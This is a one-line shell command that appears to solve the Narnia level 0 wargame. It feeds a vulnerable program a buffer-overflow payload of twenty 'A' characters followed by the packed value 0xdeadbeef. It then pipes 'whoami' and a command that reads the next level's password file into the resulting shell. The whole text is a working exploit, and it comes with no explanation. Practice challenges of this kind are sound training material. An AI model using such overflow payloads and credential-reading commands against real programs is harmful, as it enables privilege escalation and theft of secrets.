(python -c 'import struct; print"A"*20+struct.pack("<I", 0xdeadbeef)'; echo "whoami" ; echo "cat /etc/narnia_pass/narnia1") | ./narnia0
